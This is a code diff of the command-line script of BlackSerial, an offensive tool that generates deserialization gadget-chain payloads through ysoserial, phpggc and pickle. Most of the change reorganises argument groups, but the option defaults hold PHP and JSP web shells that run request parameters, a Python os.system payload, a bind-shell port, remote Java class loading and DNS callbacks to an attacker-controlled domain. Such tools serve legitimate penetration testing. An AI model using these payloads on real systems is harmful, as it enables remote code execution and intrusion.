@@ -1,13 +1,8 @@
 #!/usr/bin/python3
 
 import argparse
-import subprocess
 import sys
-import tempfile
-import re
-import os
 import logging
-import base64
 from serialiazers import *
 
 class ColorFormatter(logging.Formatter):
@@ -64,39 +59,51 @@ def createGenerator(serializer, args):
 if __name__ == '__main__':
 
     title = "BlackSerial"
-    description = "Blackbox Gadget Chain Payloads Generator"
-    default_system_command = 'nslookup %domain%'
+    description = "Blackbox Gadget Chain Payloads Generator (@darkpills)"
+    default_system_command = 'nslookup %%domain%%'
     available_serializers = ['ysoserial', 'phpggc', 'pickle', 'ysoserial.net']
 
-    parser = argparse.ArgumentParser(prog='BlackSerial', description=description, epilog='Author: @darkpills')
+    parser = argparse.ArgumentParser(prog='BlackSerial', description=description, formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+
     parser.add_argument('chains', help="Specific gadget chain to generate", nargs='*') 
-    parser.add_argument('-o', '--out', help="Output payloads to file", default="payloads.txt")
-    parser.add_argument('-l', '--list', help="List payloads only", action="store_true")
-    parser.add_argument('-s', '--serializer', help="Gadget chain serializer", choices=available_serializers + ['all'], default='ysoserial')
-    parser.add_argument('-c', '--system-command', help="System command executed for all chains, %domain% is replaced by --interact-domain parameter", default=default_system_command)
-    parser.add_argument('-rf', '--remote-file', help="File path written locally on remote server for 'File Write' type chains, where %ext% is php, jsp, py depending on the gadget chain", default='./blackserial.%ext%')
-    parser.add_argument('-rp', '--remote-port', help="Remote port that will be opened on remote server", default='54321')
-    parser.add_argument('-i', '--interact-domain', help="Domain for listening to DNS, HTTP callbacks: collaborator, interactsh...")
-    parser.add_argument('-u', '--url', help="URL encodes the payload", action="store_true")
-    parser.add_argument('-b', '--base64', help="Base64 encode the payload", action="store_true")
-    parser.add_argument('-nc', '--no-color', help='No colored output', action="store_true")
-    parser.add_argument('-v', '--verbose', help="Verbose mode", action="store_true")
+
+    common_group = parser.add_argument_group('general options')
+    common_group.add_argument('-o', '--out', help="Output payloads to file", default="payloads.txt")
+    common_group.add_argument('-l', '--list', help="List payloads only", action="store_true")
+    common_group.add_argument('-s', '--serializer', help="Gadget chain serializer", choices=available_serializers + ['all'], default='phpggc')
+    common_group.add_argument('-nc', '--no-color', help='No colored output', action="store_true")
+    common_group.add_argument('-v', '--verbose', help="Verbose mode", action="store_true")    
+
+    payload_group = parser.add_argument_group('payload')
+    payload_group.add_argument('-c', '--system-command', help="System command executed for all chains, %%domain%% is replaced by --interact-domain parameter", default=default_system_command)
+    payload_group.add_argument('-rf', '--remote-file', help="File path written locally on remote server for 'File Write' type chains, where %%ext%% is php, jsp, py depending on the gadget chain", default='./blackserial.%%ext%%')
+    payload_group.add_argument('-rc', '--remote-content', help="Remote content to write in 'File Write' type chains, defaults to jsp-code, php-code, python-code values")
+    payload_group.add_argument('-rp', '--remote-port', help="Remote port that will be opened on remote server for bind shell chains", default='54321')
+    payload_group.add_argument('-i', '--interact-domain', help="Domain for listening to outband DNS, HTTP callbacks: collaborator, interactsh...")
+
+    # output encoding
+    encoding_group = parser.add_argument_group('encoding')
+    encoding_group.add_argument('-u', '--url', help="URL encodes the payload", action="store_true")
+    encoding_group.add_argument('-b', '--base64', help="Base64 encode the payload", action="store_true")
 
     # php specific
-    parser.add_argument('-pg', '--phpggc-path', help="Full path to PHPGGC bin", default="phpggc")
-    parser.add_argument('-po', '--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
-    parser.add_argument('-pf', '--php-functions', help="PHP Functions comma-separated list, used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
-    parser.add_argument('-pc', '--php-code', help="PHP Code or filepath to a file used for 'RCE: PHP Code' and 'File Write' chains", default="<?php var_dump(%php_function%($_GET['c'])); ?> %chain_id%")
+    phpggc_group = parser.add_argument_group('phpggc')
+    phpggc_group.add_argument('-pg', '--phpggc-path', help="Full path to PHPGGC bin", default="phpggc")
+    phpggc_group.add_argument('-pf', '--php-functions', help="PHP Functions comma-separated list, used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
+    phpggc_group.add_argument('-pc', '--php-code', help="PHP Code or filepath to a file used for 'RCE: PHP Code' and 'File Write' chains", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
+    phpggc_group.add_argument('-po', '--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
 
     # java specific
-    parser.add_argument('-jp', '--java-path', help="Full path to java bin", default="java")
-    parser.add_argument('-jy', '--ysoserial-path', help="Full path to ysoserial jar", default="ysoserial.jar")
-    parser.add_argument('-jc', '--jsp-code', help="JSP Code or filepath to a file used for 'File Write' type chains", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %chain_id%")
-    parser.add_argument('-jr', '--java-remote-class-url', help="URL of the webserver serving a java class for remote dynamic loading. Use it with --java-classname", default="https://%domain%/%chain_id%")
-    parser.add_argument('-jl', '--java-classname', help="Java class name used for remote dynamic loading", default="Main")
+    ysoserial_group = parser.add_argument_group('ysoserial')
+    ysoserial_group.add_argument('-jp', '--java-path', help="Full path to java bin", default="java")
+    ysoserial_group.add_argument('-jy', '--ysoserial-path', help="Full path to ysoserial jar", default="ysoserial.jar")
+    ysoserial_group.add_argument('-jc', '--jsp-code', help="JSP Code or filepath to a file used for 'File Write' type chains", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
+    ysoserial_group.add_argument('-jr', '--java-remote-class-url', help="URL of the webserver serving a java class for remote dynamic loading. Use it with --java-classname", default="https://%%domain%%/%%chain_id%%")
+    ysoserial_group.add_argument('-jl', '--java-classname', help="Java class name used for remote dynamic loading", default="Main")
 
     # python specific
-    parser.add_argument('-yc', '--python-code', help="Python Code or filepath to a file used for 'File Write' type chains", default="raise Exception(os.system('%system_command%'))")
+    pickle_group = parser.add_argument_group('pickle')
+    pickle_group.add_argument('-yc', '--python-code', help="Python Code or filepath to a file containing the code", default="import os; os.system('%%system_command%%')")
     
     args = parser.parse_args()
 
@@ -104,11 +111,11 @@ if __name__ == '__main__':
 
     logging.info(title)
 
-    if '%domain%' in args.system_command and args.interact_domain == None and args.system_command == default_system_command:
+    if '%%domain%%' in args.system_command and args.interact_domain == None and args.system_command == default_system_command:
         logging.warning("Defaulting to 'whoami' payload since no interact domain provided")
         args.system_command = 'whoami'
-    elif '%domain%' in args.system_command and args.interact_domain == None:
-        logging.error(f"No interact domain provided, but %domain% placeholder found in system command: {args.system_command}")
+    elif '%%domain%%' in args.system_command and args.interact_domain == None:
+        logging.error(f"No interact domain provided, but %%domain%% placeholder found in system command: {args.system_command}")
         logging.error(f"Use --interact-domain <mydomain> option")
         sys.exit(-1)
     if str(args.interact_domain) == '':
